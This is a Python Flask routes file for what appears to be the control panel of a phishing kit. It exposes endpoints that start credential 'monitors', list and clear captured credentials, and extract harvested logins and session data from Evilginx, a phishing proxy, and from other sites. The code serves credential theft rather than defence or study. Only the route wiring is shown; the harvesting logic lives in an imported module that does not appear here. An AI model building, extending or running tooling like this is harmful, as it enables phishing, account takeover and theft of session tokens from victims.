"""
Credentials Monitoring API Routes
"""

from flask import Blueprint, request, jsonify
from modules import credentials

# Create blueprint
credentials_bp = Blueprint('credentials', __name__)

@credentials_bp.route('/status', methods=['GET'])
def get_status():
    """Get the status of the credentials monitoring module"""
    monitors = credentials.get_active_monitors()
    
    return jsonify({
        "status": "active",
        "module": "credentials_monitoring",
        "active_monitors": len([m for m, data in monitors.items() if data["active"]]),
        "monitors": monitors
    })

@credentials_bp.route('/start', methods=['POST'])
def start_monitoring():
    """Start a new credentials monitoring thread"""
    monitor_id = credentials.start_monitoring()
    
    return jsonify({
        "status": "success",
        "message": f"Monitoring started with ID: {monitor_id}",
        "monitor_id": monitor_id
    })

@credentials_bp.route('/stop/<monitor_id>', methods=['POST'])
def stop_monitoring(monitor_id):
    """Stop a specific monitoring thread"""
    result = credentials.stop_monitoring(monitor_id)
    
    if result['status'] == 'error':
        return jsonify(result), 400
    else:
        return jsonify(result)

@credentials_bp.route('/list', methods=['GET'])
def list_credentials():
    """List all captured credentials"""
    monitor_id = request.args.get('monitor_id')
    
    creds = credentials.get_credentials(monitor_id)
    
    return jsonify({
        "status": "success",
        "count": len(creds),
        "credentials": creds
    })

@credentials_bp.route('/clear', methods=['POST'])
def clear_credentials():
    """Clear all captured credentials"""
    # Fixed: Properly handle POST requests with JSON data
    data = request.get_json(silent=True) or {}
    monitor_id = data.get('monitor_id')
    
    result = credentials.clear_credentials(monitor_id)
    
    if result['status'] == 'error':
        return jsonify(result), 400
    else:
        return jsonify(result)

@credentials_bp.route('/monitors', methods=['GET'])
def get_monitors():
    """Get all active credential monitors"""
    monitors = credentials.get_active_monitors()
    
    return jsonify({
        "status": "success",
        "monitors": monitors
    })

@credentials_bp.route('/extract', methods=['GET'])
def extract_all_credentials():
    """Extract credentials from all sources without monitoring"""
    evilginx_creds = credentials.extract_evilginx_sessions()
    site_creds = credentials.extract_site_credentials()
    
    all_creds = evilginx_creds + site_creds
    
    return jsonify({
        "status": "success",
        "count": len(all_creds),
        "evilginx_count": len(evilginx_creds),
        "site_count": len(site_creds),
        "credentials": all_creds
    })